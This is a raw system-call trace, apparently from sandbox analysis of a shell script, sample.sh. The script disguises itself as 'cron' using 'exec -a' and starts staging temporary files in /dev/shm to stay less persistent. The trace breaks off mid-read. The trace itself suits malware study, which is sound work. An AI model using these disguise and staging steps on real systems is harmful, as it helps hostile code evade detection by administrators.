9     10:07:54.886524 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.887401 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.888281 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.889120 read(255</sandbox/sample.sh>, "\n\n# Use exec -a to rename the pr"..., 1504) = 894
9     10:07:54.890233 pipe2([3<pipe:[79132]>, 4<pipe:[79132]>], 0) = 0
9     10:07:54.890887 fcntl(4<pipe:[79132]>, F_GETPIPE_SZ) = 65536
9     10:07:54.891474 write(4<pipe:[79132]>, "    # This runs in a new process"..., 809) = 809
9     10:07:54.896423 close(4<pipe:[79132]>) = 0
9     10:07:54.902723 fcntl(0</dev/null>, F_GETFD) = 0
9     10:07:54.905097 fcntl(0</dev/null>, F_DUPFD, 10) = 10</dev/null>
9     10:07:54.906519 fcntl(0</dev/null>, F_GETFD) = 0
9     10:07:54.907729 fcntl(10</dev/null>, F_SETFD, FD_CLOEXEC) = 0
9     10:07:54.908946 dup2(3<pipe:[79132]>, 0</dev/null>) = 0<pipe:[79132]>
9     10:07:54.910040 close(3<pipe:[79132]>) = 0
9     10:07:54.911002 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.911822 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.912471 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.912934 lseek(255</sandbox/sample.sh>, -81, SEEK_CUR) = 1423
9     10:07:54.913623 execve("/bin/bash", ["cron"], 0x55c91260df20 /* 7 vars */) = 0
9     10:07:54.915599 brk(NULL)         = 0x5dc497ae7000
9     10:07:54.916256 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7201ca4ae000
9     10:07:54.916821 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
9     10:07:54.918253 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     10:07:54.926318 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
9     10:07:54.929903 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7201ca4a9000
9     10:07:54.931684 mmap(0x7201ca4aa000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7201ca4aa000
9     10:07:54.933292 mmap(0x7201ca4ab000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7201ca4ab000
9     10:07:54.934431 mmap(0x7201ca4ac000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7201ca4ac000
9     10:07:54.935464 close(3</usr/lib/libfake_tracer.so>) = 0
9     10:07:54.936415 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9     10:07:54.937354 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
9     10:07:54.938303 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     10:07:54.939088 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7201ca4a7000
9     10:07:54.939791 close(3</etc/ld.so.cache>) = 0
9     10:07:54.940465 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>
9     10:07:54.940960 read(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     10:07:54.941455 fstat(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, {st_mode=S_IFREG|0644, st_size=208328, ...}) = 0
9     10:07:54.941945 mmap(NULL, 211240, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0) = 0x7201ca473000
9     10:07:54.942489 mmap(0x7201ca481000, 77824, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0xe000) = 0x7201ca481000
9     10:07:54.942972 mmap(0x7201ca494000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x21000) = 0x7201ca494000
9     10:07:54.943443 mmap(0x7201ca4a2000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x2e000) = 0x7201ca4a2000
9     10:07:54.946073 close(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>) = 0
9     10:07:54.952453 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     10:07:54.954979 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     10:07:54.956570 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:54.957868 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     10:07:54.959068 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:54.960113 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7201ca261000
9     10:07:54.961112 mmap(0x7201ca289000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7201ca289000
9     10:07:54.962506 mmap(0x7201ca411000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7201ca411000
9     10:07:54.963346 mmap(0x7201ca460000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7201ca460000
9     10:07:54.964268 mmap(0x7201ca466000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7201ca466000
9     10:07:54.965921 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
9     10:07:54.966726 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7201ca25f000
9     10:07:54.973170 arch_prctl(ARCH_SET_FS, 0x7201ca25fb80) = 0
9     10:07:54.976587 set_tid_address(0x7201ca25fe50) = 9
9     10:07:54.978378 set_robust_list(0x7201ca25fe60, 24) = 0
9     10:07:54.979984 rseq(0x7201ca2604a0, 0x20, 0, 0x53053053) = 0
9     10:07:54.981376 mprotect(0x7201ca460000, 16384, PROT_READ) = 0
9     10:07:54.982622 mprotect(0x7201ca4a2000, 16384, PROT_READ) = 0
9     10:07:54.983690 mprotect(0x7201ca4ac000, 4096, PROT_READ) = 0
9     10:07:54.984848 mprotect(0x5dc465ac4000, 16384, PROT_READ) = 0
9     10:07:54.985550 mprotect(0x7201ca4e6000, 8192, PROT_READ) = 0
9     10:07:54.986292 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     10:07:54.987055 munmap(0x7201ca4a7000, 7295) = 0
9     10:07:54.987839 openat(AT_FDCWD</sandbox>, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address)
9     10:07:54.988518 ioctl(0<pipe:[79132]>, TCGETS, 0x7ffe4bfa9ca0) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:54.989140 getrandom("\xe3\xc7\xef\x6d\xd7\xae\xc7\xf3", 8, GRND_NONBLOCK) = 8
9     10:07:54.991546 brk(NULL)         = 0x5dc497ae7000
9     10:07:54.997499 brk(0x5dc497b08000) = 0x5dc497b08000
9     10:07:55.000182 getuid()          = 1001
9     10:07:55.001822 getgid()          = 1001
9     10:07:55.003276 geteuid()         = 1001
9     10:07:55.004333 getegid()         = 1001
9     10:07:55.005407 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.006370 ioctl(0<pipe:[79132]>, TCGETS, 0x7ffe4bfa9cc0) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.007199 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.007958 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.008589 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.009197 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.009871 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.010410 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.010949 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.011471 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.011975 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.012437 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.012938 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     10:07:55.013460 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.014482 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.021379 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.024244 uname({sysname="Linux", nodename="fc1e21eea59f", ...}) = 0
9     10:07:55.025928 newfstatat(AT_FDCWD</sandbox>, "/sandbox", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.027319 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.028448 newfstatat(AT_FDCWD</sandbox>, "/sandbox", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.029544 getpid()          = 9
9     10:07:55.030471 getppid()         = 1
9     10:07:55.031329 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.032329 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.033096 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.033844 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.034549 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.035207 newfstatat(AT_FDCWD</sandbox>, "/sbin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.035889 newfstatat(AT_FDCWD</sandbox>, "/bin/cron", 0x7ffe4bfa9860, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.036456 newfstatat(AT_FDCWD</sandbox>, "cron", 0x7ffe4bfa9a50, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.037032 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[79133]>
9     10:07:55.037516 connect(3<socket:[79133]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     10:07:55.038028 close(3<socket:[79133]>) = 0
9     10:07:55.038457 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[79134]>
9     10:07:55.038897 connect(3<socket:[79134]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     10:07:55.039343 close(3<socket:[79134]>) = 0
9     10:07:55.039764 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
9     10:07:55.040132 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.040508 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
9     10:07:55.040888 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     10:07:55.041247 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
9     10:07:55.041615 read(3</etc/nsswitch.conf>, "", 4096) = 0
9     10:07:55.041955 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     10:07:55.042294 close(3</etc/nsswitch.conf>) = 0
9     10:07:55.042633 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
9     10:07:55.042998 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
9     10:07:55.043340 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
9     10:07:55.043690 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
9     10:07:55.044043 close(3</etc/passwd>) = 0
9     10:07:55.044432 getpid()          = 9
9     10:07:55.044764 getppid()         = 1
9     10:07:55.045095 getpid()          = 9
9     10:07:55.045418 getppid()         = 1
9     10:07:55.045790 getpgrp()         = 1
9     10:07:55.046125 ioctl(2<pipe:[78066]>, TIOCGPGRP, 0x7ffe4bfa9bb4) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.046470 rt_sigaction(SIGCHLD, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.046882 ioctl(2<pipe:[78066]>, TIOCGPGRP, 0x7ffe4bfa9b64) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.047234 prlimit64(0, RLIMIT_NPROC, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
9     10:07:55.047608 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.047967 fcntl(0<pipe:[79132]>, F_GETFL) = 0 (flags O_RDONLY)
9     10:07:55.048343 fstat(0<pipe:[79132]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
9     10:07:55.048768 lseek(0<pipe:[79132]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9     10:07:55.049184 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.049589 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.049975 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.050324 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.050674 read(0<pipe:[79132]>, "#", 1) = 1
9     10:07:55.051025 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.051391 read(0<pipe:[79132]>, "T", 1) = 1
9     10:07:55.051740 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.052098 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.052441 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.052788 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.053132 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.053469 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.053809 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.054146 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.054484 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.054829 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.055182 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.055529 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.055865 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.056215 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.056566 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.056909 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.057248 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.057595 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.057930 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.058269 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.058616 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.058956 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.059294 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.059635 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.059965 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.060368 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.060767 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.061136 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.061485 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.061836 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.062220 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.062582 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.062932 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.063265 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.063600 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.063948 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.064329 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.064677 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.065086 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.065492 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.065964 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.066503 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.066865 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.067230 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.067586 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.067936 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.068333 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.068680 read(0<pipe:[79132]>, "#", 1) = 1
9     10:07:55.069021 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.069358 read(0<pipe:[79132]>, "U", 1) = 1
9     10:07:55.069694 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.070032 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.070366 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.070753 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.071188 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.071657 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.072087 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.072529 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.072950 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.073392 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.073775 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.074151 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.074548 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:55.075019 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.075539 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.076120 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.076739 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.077408 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.077981 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.078490 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.079019 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.079511 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.079996 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.080525 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.081068 read(0<pipe:[79132]>, "y", 1) = 1
9     10:07:55.081566 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.082197 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:55.082883 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.083530 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.084174 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.084790 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.085374 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.085948 read(0<pipe:[79132]>, "(", 1) = 1
9     10:07:55.086514 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.087097 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.087680 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.088233 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.088790 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.089352 read(0<pipe:[79132]>, "y", 1) = 1
9     10:07:55.089919 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.090479 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.091057 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.091633 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.092216 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.092774 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.093384 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.094011 read(0<pipe:[79132]>, ",", 1) = 1
9     10:07:55.094675 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.095300 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.095936 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.096614 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.097267 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.097893 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.098543 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.099170 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.099750 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.100408 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.100960 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.101548 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.102152 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.102757 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.103353 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.103919 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.104480 read(0<pipe:[79132]>, ")", 1) = 1
9     10:07:55.105082 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.105661 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.106219 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.106802 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.107373 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.107985 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.108603 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.109193 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.109808 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.110432 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.111027 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.111570 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.112234 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.112892 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.113423 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.114192 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.114853 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.115492 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.116155 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.116831 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.117453 read(0<pipe:[79132]>, "h", 1) = 1
